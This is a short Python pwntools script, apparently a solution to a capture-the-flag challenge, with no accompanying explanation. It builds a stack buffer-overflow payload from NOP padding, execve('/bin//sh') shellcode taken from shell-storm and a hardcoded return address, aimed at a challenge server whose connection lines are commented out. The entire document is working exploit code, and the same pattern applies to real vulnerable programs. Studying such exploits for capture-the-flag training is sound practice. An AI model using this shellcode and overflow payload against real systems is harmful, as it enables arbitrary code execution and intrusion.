#!/usr/bin/env python3

from pwn import *

#context.log_level = 'INFO'
#context.log_file = 'remote.log'
#p = remote('chal.cybersecurityrumble.de', 1990)
stack = 0x00007fffffffe738

# http://shell-storm.org/shellcode/files/shellcode-905.php
shellcode  = b'\x6a\x42\x58\xfe\xc4\x48\x99\x52'
shellcode += b'\x48\xbf\x2f\x62\x69\x6e\x2f\x2f'
shellcode += b'\x73\x68\x57\x54\x5e\x49\x89\xd0'
shellcode += b'\x49\x89\xd2\x0f\x05'
shellcode += (8 - (len(shellcode) % 8)) *  b'\x90'

payload  = b''
payload += 6 * b'A'
payload += 2 * b'\0'
payload += (0x78 - 8 - 16 - len(shellcode)) * b'\x90'
payload += shellcode
payload += (0x78 - len(payload)) * b'\x90'
payload += p64(stack)
sys.stdout.buffer.write(payload)

#p.sendlineafter('return.\n',payload)
#p.interactive()
